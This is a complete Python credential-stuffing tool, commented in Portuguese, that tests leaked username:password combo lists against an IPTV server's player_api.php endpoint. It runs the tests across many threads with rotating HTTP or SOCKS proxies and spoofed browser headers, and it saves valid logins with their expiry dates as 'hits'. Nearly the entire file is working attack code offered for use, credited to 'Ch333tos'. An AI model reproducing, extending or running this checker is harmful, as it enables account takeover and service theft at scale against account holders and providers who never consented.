import os
import random
import requests
import threading
from datetime import datetime

# Cores para melhorar a visualização
CORES = {
    "vermelho": "\033[91m",
    "verde": "\033[92m",
    "amarelo": "\033[93m",
    "azul": "\033[94m",
    "magenta": "\033[95m",
    "ciano": "\033[96m",
    "reset": "\033[0m",
}

# Função para limpar o host (remover http://, https://, barras e espaços)
def limpar_host(host):
    host = host.replace("http://", "").replace("https://", "")  # Remove protocolos
    host = host.split("/")[0]  # Remove barras no final
    host = host.strip()  # Remove espaços em branco
    return host

# Função para listar arquivos em uma pasta e permitir a escolha pelo número
def escolher_arquivo(pasta, nome_pasta):
    if not os.path.exists(pasta):
        print(f"A pasta {nome_pasta} não existe. Criando...")
        os.makedirs(pasta)
        return None

    arquivos = [f for f in os.listdir(pasta) if f.endswith('.txt')]
    if not arquivos:
        print(f"Nenhum arquivo encontrado na pasta {nome_pasta}.")
        return None

    print(f"Arquivos disponíveis em {nome_pasta}:")
    for i, arquivo in enumerate(arquivos):
        print(f"{i + 1}. {arquivo}")

    try:
        escolha = int(input("Escolha o número do arquivo: ")) - 1
        if 0 <= escolha < len(arquivos):
            return os.path.join(pasta, arquivos[escolha])
        else:
            print("Escolha inválida.")
            return None
    except ValueError:
        print("Entrada inválida. Digite um número.")
        return None

# Função para configurar o tipo de proxy
def configurar_proxy(tipo, proxy):
    if tipo == 1:  # HTTP
        return {"http": proxy, "https": proxy}
    elif tipo == 2:  # HTTPS
        return {"http": proxy, "https": proxy}
    elif tipo == 3:  # SOCKS4
        return {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
    elif tipo == 4:  # SOCKS5
        return {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"}
    else:
        return None

# Função para converter timestamp em data legível
def converter_data(timestamp):
    try:
        return datetime.fromtimestamp(int(timestamp)).strftime('%Y-%m-%d %H:%M:%S')
    except:
        return "Ilimitada!"

# Função para testar usuário e senha (com ou sem proxy)
def test_account(username, password, proxy_config, server, headers):
    url = f"http://{server}/player_api.php?username={username}&password={password}"
    try:
        response = requests.get(
            url,
            proxies=proxy_config,
            headers=headers,
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            # Acessar user_info e extrair informações
            user_info = data.get("user_info", {})
            status = user_info.get("status", "Desconhecido")
            exp_date = user_info.get("exp_date")
            exp_date = "Ilimitada!" if exp_date is None else converter_data(exp_date)
            return username, password, status, exp_date, response.status_code
        else:
            return username, password, None, None, response.status_code
    except Exception as e:
        return username, password, None, None, str(e)

# Função para exibir informações durante o checamento
def exibir_informacoes(server, user, password, status_code, linha_atual, total_linhas, hits, bads):
    print(f"\n{CORES['azul']}=====> DEEPSEEK ULTRA <====={CORES['reset']}")
    print(f"SERVER > {server}")
    print(f"USUÁRIO > {user}")
    print(f"SENHA > {password}")
    print(f"{CORES['ciano']}=====> INFORMATIVO DS <====={CORES['reset']}")
    print(f"STATUS > {status_code}")
    print(f"LINHA > {linha_atual}/{total_linhas}")
    print(f"HITS > {CORES['verde']}{hits}{CORES['reset']}")
    print(f"BADS > {CORES['vermelho']}{bads}{CORES['reset']}")
    print(f"{CORES['magenta']}===> CONFIG BY CH333TOS <==={CORES['reset']}")

# Função para processar combos com múltiplos bots
def processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, total_linhas, caminho_arquivo):
    lock = threading.Lock()

    def worker():
        nonlocal hits, bads
        while True:
            with lock:
                if not combos:
                    break
                user, password = combos.pop(0)
                linha_atual = total_linhas - len(combos)

            proxy_config = None
            if proxies and tipo_proxy:
                proxy = random.choice(proxies)
                proxy_config = configurar_proxy(tipo_proxy, proxy)

            result = test_account(user, password, proxy_config, server, headers)
            username, password, status, exp_date, status_code = result

            with lock:
                if status:
                    hits += 1
                    # Salvar resultado imediatamente
                    try:
                        with open(caminho_arquivo, "a", encoding='utf-8') as f:
                            f.write(
                                f"=====[ DEEPSEEK CHECKER ]=====\n"
                                f"HOST: {server}\n"
                                f"USER: {username}\n"
                                f"PASS: {password}\n"
                                f"EXP: {exp_date}\n"
                                f"STATUS: {status}\n"
                                f"====[ IPTV CHK BY: Ch333tos ]====\n\n"
                            )
                    except Exception as e:
                        print(f"Erro ao salvar o arquivo: {e}")
                else:
                    bads += 1

                # Exibir informações durante o checamento
                exibir_informacoes(server, username, password, status_code, linha_atual, total_linhas, hits, bads)

    threads = []
    for _ in range(num_bots):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return hits, bads

# Função principal
def main():
    # Caminho das pastas
    pasta_combo = "/sdcard/combo"
    pasta_proxy = "/sdcard/proxy"
    pasta_hits = "/sdcard/hits"

    # Criar pastas se não existirem
    for pasta in [pasta_combo, pasta_proxy, pasta_hits]:
        if not os.path.exists(pasta):
            print(f"A pasta {pasta} não existe. Criando...")
            os.makedirs(pasta)

    # Escolher arquivo de combo
    print("Escolha o arquivo de combo:")
    arquivo_combo = escolher_arquivo(pasta_combo, "combo")
    if not arquivo_combo:
        return

    # Perguntar se deseja usar proxy
    usar_proxy = input("Deseja usar proxy? (1 para Sim, 2 para Não): ")
    if usar_proxy not in ["1", "2"]:
        print("Escolha inválida. Digite 1 para Sim ou 2 para Não.")
        return

    proxies = []
    tipo_proxy = None  # Inicializa tipo_proxy como None
    if usar_proxy == "1":
        print("Escolha o arquivo de proxy:")
        arquivo_proxy = escolher_arquivo(pasta_proxy, "proxy")
        if not arquivo_proxy:
            return

        # Ler proxies
        with open(arquivo_proxy, 'r') as f:
            proxies = [linha.strip() for linha in f.readlines()]

        # Escolher tipo de proxy
        print("Escolha o tipo de proxy:")
        print("1. HTTP")
        print("2. HTTPS")
        print("3. SOCKS4")
        print("4. SOCKS5")
        try:
            tipo_proxy = int(input("Digite o número do tipo de proxy: "))
            if tipo_proxy not in [1, 2, 3, 4]:
                print("Tipo de proxy inválido.")
                return
        except ValueError:
            print("Entrada inválida. Digite um número.")
            return

    # Perguntar o número de bots
    try:
        num_bots = int(input("Digite o número de bots: "))
        if num_bots < 1:
            print("Número de bots inválido. Deve ser pelo menos 1.")
            return
    except ValueError:
        print("Entrada inválida. Digite um número.")
        return

    # Perguntar o host do servidor
    server = input("Digite o host do servidor (exemplo: meu.servidor.com): ")
    server = limpar_host(server)
    if not server:
        print("Host inválido.")
        return

    # Ler combos (usuário:senha)
    combos = []
    linhas_invalidas = 0
    with open(arquivo_combo, 'r', encoding='utf-8') as f:
        for linha in f.readlines():
            linha = linha.strip()
            if ":" in linha and len(linha.split(":")) == 2:  # Verifica se a linha está no formato correto
                username, password = linha.split(":", 1)  # Divide apenas no primeiro ":"
                combos.append((username, password))
            else:
                linhas_invalidas += 1

    if linhas_invalidas > 0:
        print(f"Removendo {linhas_invalidas} linhas inválidas.")

    if not combos:
        print("Nenhum combo válido encontrado no arquivo.")
        return

    # Configurar headers personalizados
    headers = {
        "Host": server,
        "Referer": f"http://{server}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

    # Formatar nome do arquivo de resultados
    nome_arquivo = f"ChK [ {server.replace(':', '_')} ].txt"
    caminho_arquivo = os.path.join(pasta_hits, nome_arquivo)

    # Contadores de hits e bads
    hits = 0
    bads = 0
    total_linhas = len(combos)

    # Processar combos com múltiplos bots
    hits, bads = processar_combos(combos, server, headers, proxies, tipo_proxy, num_bots, hits, bads, total_linhas, caminho_arquivo)

    # Exibir resumo final
    print(f"\nResumo final:")
    print(f"Hits: {CORES['verde']}{hits}{CORES['reset']}")
    print(f"Bads: {CORES['vermelho']}{bads}{CORES['reset']}")

if __name__ == "__main__":
    main()